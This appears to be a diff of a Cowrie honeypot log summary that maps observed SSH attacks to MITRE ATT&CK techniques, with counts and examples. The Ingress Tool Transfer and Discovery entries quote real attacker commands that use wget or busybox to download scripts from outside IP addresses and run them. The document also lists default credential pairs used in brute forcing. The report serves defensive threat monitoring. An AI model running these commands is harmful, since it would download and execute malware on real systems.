@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-09 17:02:38",
+  "generated": "2026-09-09 18:04:12",
   "totals": {
-    "commands": 3425,
-    "login_failed": 2073,
-    "login_success": 1076,
-    "sessions": 2321
+    "commands": 4587,
+    "login_failed": 2482,
+    "login_success": 1454,
+    "sessions": 2721
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2073,
+      "count": 2482,
       "examples": [
         "admin / admin",
         "root / root",
@@ -21,14 +21,14 @@
         "linuxshell / enablelinuxshell"
       ],
       "first": "2026-09-09T00:03:10.052346Z",
-      "last": "2026-09-09T17:02:32.492452Z",
-      "unique_ips": 143
+      "last": "2026-09-09T18:04:03.487886Z",
+      "unique_ips": 154
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 1076,
+      "count": 1454,
       "examples": [
         "root / root",
         "ubuntu / Oracle",
@@ -37,14 +37,14 @@
         "ftpuser / ftpuser"
       ],
       "first": "2026-09-09T00:03:10.740292Z",
-      "last": "2026-09-09T17:02:33.083095Z",
-      "unique_ips": 85
+      "last": "2026-09-09T18:04:04.047453Z",
+      "unique_ips": 87
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 186,
+      "count": 201,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -53,14 +53,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-09-09T00:03:11.283737Z",
-      "last": "2026-09-09T16:53:02.542642Z",
-      "unique_ips": 18
+      "last": "2026-09-09T17:32:06.730174Z",
+      "unique_ips": 19
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 56,
+      "count": 60,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -69,14 +69,14 @@
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t"
       ],
       "first": "2026-09-09T00:03:12.667622Z",
-      "last": "2026-09-09T16:53:02.542642Z",
-      "unique_ips": 17
+      "last": "2026-09-09T17:32:06.730174Z",
+      "unique_ips": 18
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 21,
+      "count": 22,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "sudo -n whoami 2>/dev/null",
@@ -84,8 +84,8 @@
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam"
       ],
       "first": "2026-09-09T00:03:12.667622Z",
-      "last": "2026-09-09T16:52:26.443993Z",
-      "unique_ips": 15
+      "last": "2026-09-09T17:31:30.582241Z",
+      "unique_ips": 16
     },
     {
       "id": "T1082",
@@ -184,20 +184,20 @@
   ],
   "unmapped": [
     [
-      "system",
-      1000
-    ],
-    [
       "shell",
-      1000
+      1378
     ],
     [
       "sh",
-      1000
+      1378
+    ],
+    [
+      "system",
+      1377
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      56
+      64
     ],
     [
       "/bin/busybox",
@@ -205,23 +205,23 @@
     ],
     [
       "enable",
-      15
+      16
     ],
     [
       "linuxshell",
-      13
+      14
     ],
     [
       "enablelinuxshell",
-      12
+      13
     ],
     [
       "ping ;sh",
-      12
+      13
     ],
     [
       "cd /proc && cat self/cmdline",
-      12
+      13
     ],
     [
       "busybox",
